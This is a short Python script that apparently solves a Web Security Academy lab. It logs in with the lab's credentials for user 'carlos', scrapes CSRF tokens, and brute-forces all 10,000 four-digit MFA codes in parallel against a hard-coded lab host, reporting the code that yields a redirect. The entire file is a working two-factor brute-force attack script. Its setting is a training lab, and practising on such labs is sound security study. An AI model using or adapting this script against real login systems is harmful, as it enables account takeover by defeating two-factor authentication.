import requests
import sys  # instructions say to import this lib; but it isn't being used
from bs4 import BeautifulSoup
import multiprocessing

"""
site = sys.argv[1]
if 'https://' in site:
    site = site.rstrip('/').lstrip('https://')
"""
# For me only
site = 'ac671f851f15b44e8031427e00b50093.web-security-academy.net'
answer = multiprocessing.Value('i', -1)


def try_code(csrf, code, s):
    login2_url = f'https://{site}/login2'
    login2data = {
        'csrf': csrf,
        'mfa-code': str(code).zfill(4)
    }
    resp = s.post(login2_url, data=login2data, allow_redirects=False)
    if resp.status_code == 302:
        print(f"PIN is {login2data['mfa-code']}")
        exit()
    else:
        print(".", end='')
    return resp.status_code


def get_csrf(s):
    login_url = f'https://{site}/login'
    resp = s.get(login_url)
    soup = BeautifulSoup(resp.text, 'html.parser')
    csrf = soup.find('input', {'name': 'csrf'}).get('value')

    logindata = {
        'csrf': csrf,
        'username': 'carlos',
        'password': 'montoya'
    }
    resp = s.post(login_url, data=logindata)
    soup = BeautifulSoup(resp.text, 'html.parser')
    return soup.find('input', {'name': 'csrf'}).get('value')


def dispatch_requests(arg):
    csrf = get_csrf(arg[1])
    try_code(csrf, arg[0], arg[1])


if __name__ == '__main__':
    s = requests.Session()
    p = multiprocessing.Pool(40)
    processing = range(10000)
    p.map(dispatch_requests, [[x, s] for x in processing])
    p.close()
    print("Sorry, PIN not found.")
